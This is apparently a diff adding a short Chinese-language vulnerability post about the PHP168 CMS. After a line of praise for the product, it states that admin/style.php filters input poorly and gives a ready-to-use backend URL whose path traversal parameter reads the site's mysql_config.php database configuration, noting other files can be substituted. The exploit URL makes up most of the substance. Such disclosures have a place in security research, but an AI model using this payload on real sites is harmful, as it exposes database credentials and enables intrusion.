@@ -1,0 +1,7 @@
+PHP168后台修改任意文件漏洞
+
+
+PHP168整站系统一直以来受广大用户的亲睐，它凭借着自身的强大、稳定、安全、灵活、易用等多方面的优势 ... 架构与功能的不断完善，让PHP168成为了最主流CMS系统之一。 
+
+由于admin/style.php代码过滤不严，存在漏洞 
+http://网站地址/后台目录/index.php?lfj=style&job=editcode&keywords=default&filename=../../php168/mysql_config.php 可以获取网站php168/mysql_config.php配置信息,当然也可以换成别的
